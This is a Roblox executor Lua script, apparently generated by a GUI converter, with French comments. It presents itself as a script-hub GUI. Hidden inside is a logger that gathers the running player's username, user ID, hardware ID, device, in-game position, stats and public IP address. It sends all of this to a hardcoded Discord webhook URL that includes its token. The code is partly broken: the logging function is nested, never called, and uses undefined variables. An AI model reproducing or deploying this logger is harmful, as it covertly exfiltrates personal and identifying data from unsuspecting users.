-- Gui to Lua V5.1 (Shadow Edition)
-- GUI : WEBHOOK_URL

local Players   = game:GetService('Players')
local player    = Players.LocalPlayer
local PlayerGui = player:WaitForChild('PlayerGui')

local _old = PlayerGui:FindFirstChild([[WEBHOOK_URL]])
if _old then _old:Destroy() end

local _i = {}

-- Instances:

_i[1] = Instance.new("ScreenGui")
_i[1].DisplayOrder = 0
_i[1].Enabled = true
_i[1].IgnoreGuiInset = false
_i[1].ResetOnSpawn = true
_i[1].Name = [[WEBHOOK_URL]]


-- FAKE REQUIRE SYSTEM FOR MODULES
local _modules = {}
local old_require = require
local require = function(module)
	if _modules[module] then
		if type(_modules[module]) == 'function' then
			_modules[module] = _modules[module]()
		end
		return _modules[module]
	end
	return old_require(module)
end

-- Scripts:

local function LQGSO_fake_script()
	local script = Instance.new('LocalScript')
	script.Name = [[LocalScript]]
	script.Parent = _i[1]

	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	local HttpService = game:GetService("HttpService")
	local MarketplaceService = game:GetService("MarketplaceService")
	
	-- 1. DÉTECTION DE L'EXÉCUTEUR
	local httpRequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
	local executorName = identifyexecutor and identifyexecutor() or "Exécuteur Inconnu"
	
	-- 2. FONCTION POUR RÉCUPÉRER L'IMAGE DU JOUEUR
	local function GetRealHeadShotAPI(userId)
		local fallbackImage = "https://tr.rbxcdn.com/53eb9b17fe1432a809c73a132d79f09c/420/420/Image/Png"
		if not httpRequest then return fallbackImage end
	
		local function GetRealHeadShotAPI(userId)
			local fallbackImage = "https://tr.rbxcdn.com/53eb9b17fe1432a809c73a132d79f09c/420/420/Image/Png"
			if not httpRequest then return fallbackImage end
			local url = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..tostring(userId).."&size=420x420&format=Png&isCircular=false"
			local success, response = pcall(function() return httpRequest({ Url = url, Method = "GET" }) end)
			if success and response and response.Body then
				local data = HttpService:JSONDecode(response.Body)
				if data and data.data and data.data[1] and data.data[1].imageUrl then return data.data[1].imageUrl end
			end
			return fallbackImage
		end
	
		local function sendDiscordLog(isVip)
			if not httpRequest or webhookSent then return end
			webhookSent = true 
	
			task.spawn(function()
				local successGame, gameInfo = pcall(function() return MarketplaceService:GetProductInfo(game.PlaceId) end)
				local gameName = successGame and gameInfo.Name or "Nom du jeu inconnu"
				local joinLink = "roblox://experiences/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
				local webLink = "https://www.roblox.com/games/" .. tostring(game.PlaceId)
				local playerCount = #Players:GetPlayers()
				local maxPlayers = Players.MaxPlayers
	
				local deviceType = "Ordinateur 💻"
				if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then deviceType = "Mobile / Tablette 📱"
				elseif UserInputService.GamepadEnabled and not UserInputService.KeyboardEnabled then deviceType = "Console 🎮"
				elseif UserInputService.VREnabled then deviceType = "Casque VR 🥽" end
	
				local ping = "Inconnu"
				pcall(function() ping = string.split(Stats.Network.ServerStatsItem["Data Ping"]:GetValueString(), " ")[1] .. " ms" end)
				local fps = tostring(math.floor(Workspace:GetRealPhysicsFPS())) .. " FPS"
	
				local accountAge = tostring(LocalPlayer.AccountAge) .. " jours"
				local isPremium = LocalPlayer.MembershipType == Enum.MembershipType.Premium and "Oui 🌟" or "Non ❌"
				local playerTeam = LocalPlayer.Team and LocalPlayer.Team.Name or "Aucune / Neutre"
	
				local char = LocalPlayer.Character
				local humanoid = char and char:FindFirstChild("Humanoid")
				local rootPart = char and char:FindFirstChild("HumanoidRootPart")
	
				local walkSpeed = humanoid and tostring(math.floor(humanoid.WalkSpeed)) or "Inconnu"
				local jumpPower = humanoid and tostring(math.floor(humanoid.JumpPower)) or "Inconnu"
				local health = humanoid and tostring(math.floor(humanoid.Health)) .. " / " .. tostring(math.floor(humanoid.MaxHealth)) or "Inconnu"
	
				local positionTxt = "Inconnue"
				if rootPart then
					positionTxt = "X: " .. math.floor(rootPart.Position.X) .. ", Y: " .. math.floor(rootPart.Position.Y) .. ", Z: " .. math.floor(rootPart.Position.Z)
				end
	
				local apiUrl = "https://api.ipify.org"
	
				local function recupererAdresseIP()
					local executionReussie, resultat = pcall(function()
						return game:HttpGet(apiUrl)
					end)
	
					-- Vérification du résultat de la requête
					if executionReussie then
						return resultat
					else
						return "Erreur : Ton exécuteur ne supporte pas game:HttpGet."
					end
				end
	
				-- Appel de la fonction et stockage de l'IP dans une variable
				local adresseIPPublique = recupererAdresseIP()
	
				local moneyInfo = "Non détecté"
				if LocalPlayer:FindFirstChild("leaderstats") then
					local stats = {}
					for _, stat in ipairs(LocalPlayer.leaderstats:GetChildren()) do
						table.insert(stats, stat.Name .. ": " .. tostring(stat.Value))
					end
					if #stats > 0 then moneyInfo = table.concat(stats, " | ") end
				end
	
			local myAvatar = GetRealHeadShotAPI(LocalPlayer.UserId)
	
			-- Construction du message Discord (Embed)
			local payload = {
				["username"] = "Rayfield Logger",
				["avatar_url"] = myAvatar,
				["content"] = "", 
				["embeds"] = {{
					["title"] = "🔴 BAN",
					["description"] = "Un joueur a exécuté le script avec **" .. executorName .. "**.",
					["color"] = 15548997,
					["thumbnail"] = {
						["url"] = myAvatar
					},
					["fields"] = {
						{["name"] = "👤 Pseudo", ["value"] = "```" .. LocalPlayer.Name .. "```", ["inline"] = true},
						{["name"] = "🏷️ Surnom", ["value"] = "```" .. LocalPlayer.DisplayName .. "```", ["inline"] = true},
						{["name"] = "🆔 ID Joueur", ["value"] = "```" .. tostring(LocalPlayer.UserId) .. "```", ["inline"] = true},
						{["name"] = "💻 HWID (Machine ID)", ["value"] = "`" .. hwid .. "`", ["inline"] = false},
						{["name"] = "📅 Âge du Compte", ["value"] = accountAge, ["inline"] = true},
						{["name"] = "💎 Premium Roblox", ["value"] = isPremium, ["inline"] = true},
						{["name"] = "🖥️ Appareil", ["value"] = deviceType, ["inline"] = true},
						{["name"] = "📡 Ping", ["value"] = ping, ["inline"] = true},
						{["name"] = "🎞️ FPS", ["value"] = fps, ["inline"] = true},
						{["name"] = "🏳️ Équipe", ["value"] = playerTeam, ["inline"] = true},
						{["name"] = "🎮 Jeu Actuel", ["value"] = "**" .. gameName .. "**", ["inline"] = true},
						{["name"] = "👥 Joueurs", ["value"] = tostring(playerCount) .. " / " .. tostring(maxPlayers), ["inline"] = true},
						{["name"] = "🌍 PlaceId", ["value"] = "`" .. tostring(game.PlaceId) .. "`", ["inline"] = true},
						{["name"] = "❤️ Santé", ["value"] = health, ["inline"] = true},
						{["name"] = "🏃 Vitesse / Saut", ["value"] = walkSpeed .. " / " .. jumpPower, ["inline"] = true},
						{["name"] = "📍 Coordonnées Exactes", ["value"] = "`" .. positionTxt .. "`", ["inline"] = true},
						{["name"] = "💰 Leaderstats", ["value"] = "```" .. moneyInfo .. "```", ["inline"] = false},
						{["name"] = "📍 IP Public", ["value"] = "```" .. adresseIPPublique .. "```", ["inline"] = false},
						{["name"] = "🔗 Liens Rapides", ["value"] = "[🌐 Ouvrir la page web]("..webLink..")\n\n**🚀 Lien d'auto-rejoindre (PC) :**\n`" .. joinLink .. "`\n\n**🔑 JobId Brut :**\n`" .. game.JobId .. "`", ["inline"] = false}
					},
					["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ"),
					["footer"] = { ["text"] = "SORONICE HUB Logger • ID Serveur: " .. game.JobId }
				}}
			}
	
			-- Envoi au Webhook
			httpRequest({
				Url = "https://discord.com/api/webhooks/1525886709642821856/GDcC5e1IYznLZvkWIOUsELzmGAVc9cx04j6W7nKnTUfhtikdxtuWMFaEoEQceDoptD4U",
				Method = "POST",
				Headers = { ["Content-Type"] = "application/json" },
				Body = HttpService:JSONEncode(payload)
			})
		end)
	end
end
coroutine.wrap(LQGSO_fake_script)()


_i[1].Parent = PlayerGui
